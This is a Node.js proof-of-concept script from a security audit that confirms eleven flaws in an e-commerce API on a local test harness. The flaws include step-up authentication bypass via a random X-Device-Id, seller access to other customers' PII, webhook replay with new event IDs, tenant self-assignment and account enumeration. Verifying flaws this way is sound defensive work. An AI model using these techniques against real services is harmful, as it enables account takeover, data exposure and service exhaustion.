// Security PoCs. Run from the repo root:  node security-tests/poc.mjs
// Local only: starts its own API on 127.0.0.1:5055 with an in-memory database (see harness.mjs).
import crypto from 'node:crypto';
import { ADMIN_IP, startHarness } from './harness.mjs';

const h = await startHarness();
const { users, request } = h;
const results = [];
const record = (id, title, confirmed, evidence) => {
  results.push({ id, title, confirmed, evidence });
  console.log(`${confirmed ? 'CONFIRMED' : 'NOT REPRODUCED'}  ${id}  ${title}\n    ${evidence}`);
};
const run = async (id, title, fn) => {
  try {
    await fn((confirmed, evidence) => record(id, title, confirmed, evidence));
  } catch (err) {
    record(id, title, false, `error: ${err.message}`);
  }
};

const mug = await h.createProduct('seller', { name: 'Seller Mug', price: 10, stock: 100 });
const lamp = await h.createProduct('admin', { name: 'Admin Lamp', price: 25, stock: 100 });
const addToCart = (key, productId, quantity = 1) =>
  h.must('POST', '/cart/items', { token: users[key].token, body: { productId, quantity } });

// SEC-01 / SEC-01b run against the default configuration: see trust-proxy-poc.mjs.

// SEC-02: step-up is looked up by the client-supplied X-Device-Id.
await run('SEC-02', 'Step-up authentication bypass with a fresh X-Device-Id', async (done) => {
  const ip = '192.0.2.200';
  for (let i = 0; i < 6; i++) {
    await request('POST', '/login', { body: { email: users.bob.email, password: 'Wrong-pass-1' }, headers: { 'X-Forwarded-For': ip } });
  }
  // The real attacker would have the password; the 6 failures above make the session risky.
  const risky = await h.login('bob', { 'X-Forwarded-For': ip });
  const token = risky.access_token;
  await h.must('POST', '/cart/items', { token, body: { productId: mug._id, quantity: 1 }, headers: { 'X-Forwarded-For': ip } });
  const blocked = await h.checkout('bob', { 'X-Forwarded-For': ip, Authorization: `Bearer ${token}` });
  const bypass = await h.checkout('bob', { 'X-Forwarded-For': ip, Authorization: `Bearer ${token}`, 'X-Device-Id': crypto.randomUUID() });
  done(
    risky.step_up_required === true && blocked.status === 403 && bypass.status === 201,
    `login step_up_required=${risky.step_up_required}; checkout same device -> ${blocked.status} (${blocked.json?.message}); with random X-Device-Id -> ${bypass.status} (${bypass.json?.message})`
  );
});

// SEC-03: seller dashboard returns full orders of other customers incl. other sellers' items.
let aliceOrder;
await run('SEC-03', 'Seller dashboard exposes customer PII and other sellers\' line items', async (done) => {
  await addToCart('alice', mug._id);
  await addToCart('alice', lamp._id);
  const r = await h.checkout('alice');
  aliceOrder = r.json.data;
  const dash = await h.must('GET', '/seller/dashboard', { token: users.seller.token });
  const leaked = dash.recentOrders.find((o) => o._id === aliceOrder._id);
  const foreignItem = leaked?.items.find((i) => i.product === lamp._id);
  done(
    Boolean(leaked?.shippingAddress && foreignItem),
    leaked
      ? `seller sees order ${leaked._id}: user=${leaked.user}, shippingAddress.line1="${leaked.shippingAddress.line1}", total=${leaked.total}, foreign item "${foreignItem?.name}"`
      : 'order not in dashboard'
  );
});

// SEC-04: metrics keys include the raw path of unmatched routes -> unbounded memory, unauthenticated.
await run('SEC-04', 'Unbounded metrics cardinality from unauthenticated 404 paths', async (done) => {
  const before = await h.must('GET', '/metrics', { token: users.admin.token, headers: { 'X-Forwarded-For': ADMIN_IP, Accept: 'application/json' } });
  const N = 1500;
  const tag = crypto.randomBytes(4).toString('hex');
  for (let i = 0; i < N; i += 50) {
    await Promise.all(Array.from({ length: 50 }, (_, j) => fetch(`http://127.0.0.1:5055/x-${tag}-${i + j}-${'A'.repeat(2000)}`, { headers: { 'X-Forwarded-For': `192.0.2.${(i + j) % 250}` } })));
  }
  const after = await h.must('GET', '/metrics', { token: users.admin.token, headers: { 'X-Forwarded-For': ADMIN_IP, Accept: 'application/json' } });
  const count = (m) => Object.keys(m.requests ?? {}).length;
  const added = Object.keys(after.requests).filter((k) => k.includes(tag)).length;
  done(added >= N, `metrics.requests keys ${count(before)} -> ${count(after)}; ${added} new keys of ~2 KB each from ${N} anonymous requests (also in latency map)`);
});

// SEC-05: refund can be requested on any paid order, overriding fulfilment status; repeatable.
await run('SEC-05', 'Refund request ignores fulfilment state (delivered -> refund_requested)', async (done) => {
  await h.markPaid(aliceOrder._id);
  await h.must('PUT', `/orders/${aliceOrder._id}/shipment`, {
    token: users.admin.token,
    body: { carrier: 'PocPost', trackingNumber: 'T1', status: 'delivered' },
  });
  const delivered = await h.must('GET', `/orders/${aliceOrder._id}`, { token: users.alice.token });
  const r1 = await request('POST', `/orders/${aliceOrder._id}/refund`, { token: users.alice.token, body: { reason: 'poc' } });
  const r2 = await request('POST', `/orders/${aliceOrder._id}/refund`, { token: users.alice.token, body: { reason: 'poc again' } });
  // The seller can then push it back to "shipped"/"delivered" since refund_requested has no rank.
  done(
    delivered.status === 'delivered' && r1.status === 200 && r1.json.data.status === 'refund_requested',
    `status before=${delivered.status}; refund -> ${r1.status} status=${r1.json?.data?.status} (a 2nd request -> ${r2.status} "${r2.json?.message}": domain-event key collision raised after the save)`
  );
});

// SEC-05b: cancelling a paid order releases stock but leaves paymentStatus=paid with no refund.
await run('SEC-05b', 'Cancelling a paid order triggers no refund', async (done) => {
  await addToCart('alice', mug._id);
  const order = (await h.checkout('alice')).json.data;
  await h.markPaid(order._id);
  const c = await request('POST', `/orders/${order._id}/cancel`, { token: users.alice.token, body: { reason: 'poc' } });
  done(c.status === 200 && c.json.data.status === 'cancelled' && c.json.data.paymentStatus === 'paid' && [undefined, 'none'].includes(c.json.data.refundStatus), `cancel -> ${c.status} status=${c.json?.data?.status} paymentStatus=${c.json?.data?.paymentStatus} refundStatus=${c.json?.data?.refundStatus ?? 'none'}`);
});

// SEC-06: unlimited concurrent SSE streams per user.
await run('SEC-06', 'No limit on concurrent SSE streams', async (done) => {
  const controllers = [];
  let open = 0;
  await Promise.all(
    Array.from({ length: 60 }, async () => {
      const ac = new AbortController();
      controllers.push(ac);
      const res = await fetch('http://127.0.0.1:5055/api/v1/platform/stream', { headers: { Authorization: `Bearer ${users.bob.token}` }, signal: ac.signal });
      if (res.status === 200) open += 1;
    })
  );
  controllers.forEach((c) => c.abort());
  done(open === 60, `${open}/60 concurrent streams accepted for one user`);
});

// SEC-07: tenant chosen by the client at registration.
await run('SEC-07', 'Self-registration into any tenant via X-Tenant-Id', async (done) => {
  const pw = h.PASSWORD;
  const reg = await request('POST', '/register', { body: { name: 'mallory', email: 'mallory@poc.test', password: pw, repeat_password: pw }, headers: { 'X-Tenant-Id': 'victim-corp' } });
  const me = await h.must('GET', '/users', { token: reg.json.data.access_token });
  done(me.tenant === 'victim-corp', `registered with X-Tenant-Id: victim-corp -> user.tenant=${me.tenant}`);
});

// SEC-08: one product in a multi-seller order lets the seller drive the whole order's fulfilment.
await run('SEC-08', 'Seller can mark a multi-seller order delivered', async (done) => {
  await addToCart('alice', mug._id);
  await addToCart('alice', lamp._id);
  const order = (await h.checkout('alice')).json.data;
  await h.markPaid(order._id);
  const r = await request('PUT', `/orders/${order._id}/shipment`, { token: users.seller.token, body: { carrier: 'X', trackingNumber: 'Y', status: 'delivered' } });
  const after = await h.must('GET', `/orders/${order._id}`, { token: users.alice.token });
  done(r.status === 200 && after.status === 'delivered', `checkout -> ${order?._id ? 'ok' : 'failed'}; seller shipment -> ${r.status} "${r.json?.message}"; order (also contains admin's "${lamp.name}") status=${after.status}`);
});

// SEC-09: account enumeration (409 on register, timing on login).
await run('SEC-09', 'Account enumeration via register response and login timing', async (done) => {
  const pw = h.PASSWORD;
  const reg = await request('POST', '/register', { body: { name: 'enum', email: users.alice.email, password: pw, repeat_password: pw } });
  const time = async (email) => {
    const t = process.hrtime.bigint();
    await request('POST', '/login', { body: { email, password: 'Wrong-pass-1' } });
    return Number(process.hrtime.bigint() - t) / 1e6;
  };
  const median = (a) => a.sort((x, y) => x - y)[Math.floor(a.length / 2)];
  const known = [];
  const unknown = [];
  for (let i = 0; i < 9; i++) {
    known.push(await time(users.alice.email));
    unknown.push(await time(`nobody${i}@poc.test`));
  }
  done(reg.status === 409, `register existing email -> ${reg.status} "${reg.json?.message}"; login median known=${median(known).toFixed(1)} ms vs unknown=${median(unknown).toFixed(1)} ms (BCRYPT_ROUNDS=4 here; gap grows with the production default of 12)`);
});

// SEC-10: client-chosen X-Request-Id reflected and written to logs unvalidated.
await run('SEC-10', 'Unvalidated client X-Request-Id', async (done) => {
  const spoof = `admin-action-${'Z'.repeat(4000)}`;
  const r = await request('GET', '/health', { headers: { 'X-Request-Id': spoof } });
  done(r.headers.get('x-request-id') === spoof, `4 KB X-Request-Id echoed back and used as the log/audit request id`);
});

// SEC-11: webhook event id and provider are not covered by the signature.
await run('SEC-11', 'Webhook dedupe key (event id, provider) is outside the HMAC', async (done) => {
  await addToCart('alice', mug._id);
  const order = (await h.checkout('alice')).json.data;
  const payload = JSON.stringify({ orderId: order._id, type: 'payment.failed' });
  const ts = Math.floor(Date.now() / 1000);
  const sig = h.signWebhook(payload, ts);
  const send = (eventId, provider) =>
    fetch('http://127.0.0.1:5055/api/v1/payments/webhook', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Webhook-Signature': sig, 'X-Webhook-Timestamp': String(ts), 'X-Webhook-Event-Id': eventId, 'X-Payment-Provider': provider },
      body: payload,
    }).then(async (res) => ({ status: res.status, json: await res.json() }));
  const first = await send('evt-1', 'manual');
  const replaySame = await send('evt-1', 'manual');
  const replayNew = await send('evt-2-attacker', 'attacker');
  done(
    replaySame.json.data?.replay === true && replayNew.status === 200 && !replayNew.json.data?.replay,
    `original -> ${first.status}; same event id -> replay=${replaySame.json.data?.replay}; same signed body with new event id/provider -> ${replayNew.status} processed again (accepted as a new event)`
  );
});

console.log('\nSummary:');
for (const r of results) console.log(`  ${r.confirmed ? 'CONFIRMED     ' : 'NOT REPRODUCED'} ${r.id} ${r.title}`);
await h.stop();
process.exit(0);
